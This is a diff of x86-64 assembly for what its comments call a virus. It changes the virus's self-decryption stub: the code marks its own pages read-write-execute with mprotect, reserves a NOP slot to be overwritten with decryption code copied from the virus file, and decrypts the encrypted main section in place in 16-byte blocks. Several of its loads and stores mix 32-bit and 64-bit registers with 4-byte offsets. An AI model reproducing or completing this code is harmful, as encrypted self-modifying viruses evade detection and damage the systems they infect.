@@ -33,6 +33,89 @@ mov [rbp-0x10],	rcx ; offset of decrypter section
 mov [rbp-0x30], r8  ; full address of current encrypt section (main function)
 
 
+; write access to the decrypt_function below
+; unprotect virus file from write protection
+call getpagesize
+; rax has 0x1000
+mov rcx, rax
+; save rax for later use when passing to mprotect
+sub rcx, 0x1
+not rcx
+mov rdi, .decryption_function
+and rdi, rcx
+; AND them and the result will be stored in rcx
+; rdi must hold the page_start address
+mov r13, rax
+mov r14, rdi
+lea rsi, [rdi+FUNC_SIZE]      ;rsi = end
+sub rsi,rdi      ;rsi = end - aligned_start = length
+
+mov rdx, 0x7
+; read+write+exec = 0x7
+call mprotect
+
+
+
+; reload data
+mov rdi, [rbp-0x28]  ; virus data
+mov rsi, [rbp-0x20]  ; offset of encrypt section
+mov rdx, [rbp-0x18]  ; size of virus in hexa
+mov rcx, [rbp-0x10]  ; offset of decrypter section
+mov r8,  [rbp-0x30]   ; full address of current encrypt section (main function)
+
+
+; unprotect decryption_function below for write access
+
+
+; copy decryption code block from virus to decryption_function below
+; get main of virus
+; get _start - main of virus
+; run the chunk throught the decryption below and store them back
+
+; get start of decryption function of virus
+add rdi, [rbp-0x10]
+; get _start of decryption + FUNC_SIZE of virus
+lea rsi, [rdi+FUNC_SIZE]
+
+; start addr of decrypt_section below
+mov r15, .decryption_function
+
+
+; .write_decrypted_loop:
+; 	; load first 16bytes of decryption data from virus decryption_function
+; 	mov eax, [rdi]
+; 	mov ebx, [rdi+0x4]
+; 	mov ecx, [rdi+0x8]
+; 	mov edx, [rdi+0xC]
+
+
+; .write_decrypted_function:
+; 	; put decryption data to the decryption_function below
+; 	mov [r15], rax
+; 	mov [r15+0x4], rbx
+; 	mov [r15+0x8], rcx
+; 	mov [r15+0xC], rdx
+; 	add rdi,0x10
+; 	add r15, 0x10
+; 	cmp rdi, rsi
+; 	jne .write_decrypted_loop
+
+
+; ; protect area
+; 	mov     rdi, r14
+; 	mov     rsi, r13
+; 	mov     edx, 0x3
+; 	call    mprotect
+
+
+; reload data
+mov rdi, [rbp-0x28]  ; virus data
+mov rsi, [rbp-0x20]  ; offset of encrypt section
+mov rdx, [rbp-0x18]  ; size of virus in hexa
+mov rcx, [rbp-0x10]  ; offset of decrypter section
+mov r8,  [rbp-0x30]   ; full address of current encrypt section (main function)
+
+
 ; write access from virus file, main to _start-main
 add rdi, rsi
 ; this gives us main in the virus file
@@ -58,41 +141,71 @@ call mprotect
 
 
 ; reload data
-mov rdi, [rbp-0x28]  ; virus data
-mov rsi, [rbp-0x20]  ; offset of encrypt section
-mov rdx, [rbp-0x18]  ; size of virus in hexa
-mov rcx, [rbp-0x10]  ; offset of decrypter section
-mov r8,  [rbp-0x30]   ; full address of current encrypt section (main function)
+	mov rdi, [rbp-0x28]  ; virus data
+	mov rsi, [rbp-0x20]  ; offset of encrypt section
+	mov rdx, [rbp-0x18]  ; size of virus in hexa
+	mov rcx, [rbp-0x10]  ; offset of decrypter section
+	mov r8,  [rbp-0x30]   ; full address of current encrypt section (main function)
+
+; get virus main
+; get virus main + enc_size
+; run through the decryption function
+
+mov rax, rsi
+add rsi, rdi
+lea rdi, [rsi+rdx]
+
+
+.decryption_loop:
+	; load first 16bytes of virus data to registers
+	mov eax, [rsi]
+	mov ebx, [rsi+0x4]
+	mov ecx, [rsi+0x8]
+	mov edx, [rsi+0xC]
+
+.decryption_function:
+	times FUNC_SIZE db OP_NOP
+	; put back the data to where it was taken from
+	mov [rsi], eax
+	mov [rsi+0x4], ebx
+	mov [rsi+0x8], ecx
+	mov [rsi+0xC], edx
+	add rsi, 0x10
+	; add 10h to rsi, fast forwards rsi to decrypt next 16bytes
+	cmp rsi, rdi
+	;compare if rsi = rdi, signalling end of decryption
+	jne .decryption_loop
 
 
 
 
-; write decrypted block from memory to virus file
-mov r14, r8
-add rdi, rsi
-; rdi = _virus_+main
-mov r15, rdi
-add r15, rdx
-; r15 = _virus_ + main + enc_size
-.write_decrypted_loop:
-	; load first 16bytes of memory data to registers
-	mov rax, [r14]
-	mov rbx, [r14+0x4]
-	mov rcx, [r14+0x8]
-	mov rdx, [r14+0xC]
 
-.write_decrypted_function:
-	; put what was taken from memory to equivalent place in the virus file
-	mov [rdi], rax
-	mov [rdi+0x4], rbx
-	mov [rdi+0x8], rcx
-	mov [rdi+0xC], rdx
-	add r14, 0x10
-	add rdi, 0x10
-	; add 10h to r8, fast forwards rsi to grabbing next 16 bytes
-	cmp r14, r15
-	;compare if r8 = r15, signalling end of decryption
-	jne .write_decrypted_loop
+; ; write decrypted block from memory to virus file
+; mov r14, r8
+; add rdi, rsi
+; ; rdi = _virus_+main
+; mov r15, rdi
+; add r15, rdx
+; ; r15 = _virus_ + main + enc_size
+; .write_decrypted_loop:
+; 	; load first 16bytes of memory data to registers
+; 	mov rax, [r14]
+; 	mov rbx, [r14+0x4]
+; 	mov rcx, [r14+0x8]
+; 	mov rdx, [r14+0xC]
+
+; .write_decrypted_function:
+; 	; put what was taken from memory to equivalent place in the virus file
+; 	mov [rdi], rax
+; 	mov [rdi+0x4], rbx
+; 	mov [rdi+0x8], rcx
+; 	mov [rdi+0xC], rdx
+; 	add r14, 0x10
+; 	add rdi, 0x10
+; 	; add 10h to r8, fast forwards rsi to grabbing next 16 bytes
+; 	cmp r14, r15
+; 	;compare if r8 = r15, signalling end of decryption
+; 	jne .write_decrypted_loop
 
 
 
